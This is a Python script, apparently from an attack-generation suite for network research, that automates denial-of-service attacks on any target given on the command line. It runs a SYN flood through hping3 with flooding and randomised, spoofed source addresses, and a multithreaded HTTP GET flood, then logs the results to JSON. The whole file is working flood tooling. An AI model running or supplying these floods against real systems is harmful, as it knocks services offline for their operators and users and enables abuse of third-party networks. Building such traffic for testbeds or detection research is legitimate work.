#!/usr/bin/env python3
"""HTTP DoS Flood Attack Automation (A1 — Network)."""
import argparse, subprocess, time, json, os, threading
from datetime import datetime

def syn_flood(target, duration=60, rate=1000):
    cmd = ['hping3', '-S', '-p', '80', '--flood', '--fast', '-d', '120', '--rand-source', target]
    start = time.time()
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=duration+10)
        elapsed = time.time() - start
        return {'type': 'syn_flood', 'target': target, 'duration': round(elapsed, 2), 'estimated_packets': rate*duration, 'return_code': proc.returncode, 'timestamp': datetime.now().isoformat()}
    except subprocess.TimeoutExpired:
        return {'type': 'syn_flood', 'target': target, 'duration': duration, 'estimated_packets': rate*duration, 'return_code': -1, 'timestamp': datetime.now().isoformat()}

def http_get_flood(target, duration=60, rate=50):
    try:
        import requests, concurrent.futures
    except ImportError:
        return {'error': 'requests module required', 'type': 'http_get'}
    total_req, total_err, response_times = 0, 0, []
    end_time = time.time() + duration
    sem = threading.Semaphore(rate)
    def _req(_):
        nonlocal total_req, total_err
        while time.time() < end_time:
            try:
                sem.acquire()
                s = time.time()
                try: requests.get(f"http://{target}", timeout=2, headers={'User-Agent': 'AttackBot/1.0'}); response_times.append((time.time()-s)*1000); total_req += 1
                except: total_err += 1
                finally: sem.release()
            except: break
    threads = []
    for _ in range(rate):
        t = threading.Thread(target=_req, daemon=True); t.start(); threads.append(t)
    time.sleep(duration)
    for t in threads: t.join(timeout=1)
    elapsed = time.time() - (end_time - duration)
    return {'type': 'http_get_flood', 'target': target, 'duration': round(elapsed, 2), 'total_requests': total_req, 'total_errors': total_err, 'avg_rt_ms': round(sum(response_times)/len(response_times), 2) if response_times else 0, 'req_per_sec': round(total_req/elapsed, 1), 'timestamp': datetime.now().isoformat()}

def main():
    p = argparse.ArgumentParser(description="HTTP DoS Attack (A1)")
    p.add_argument("--target", required=True); p.add_argument("--type", choices=['syn_flood', 'http_get'], default='syn_flood')
    p.add_argument("--duration", type=int, default=60); p.add_argument("--rate", type=int, default=1000)
    p.add_argument("--output-dir", default="data/results")
    args = p.parse_args()
    if args.type == 'syn_flood': results = syn_flood(args.target, args.duration, args.rate)
    else: results = http_get_flood(args.target, args.duration, args.rate)
    os.makedirs(args.output_dir, exist_ok=True)
    with open(f"{args.output_dir}/http_flood_{args.type}_{int(time.time())}.json", 'w') as f: json.dump(results, f, indent=2)
    print(f"[HTTP FLOOD] Completed. Duration: {results.get('duration', 0)}s")

if __name__ == "__main__": main()
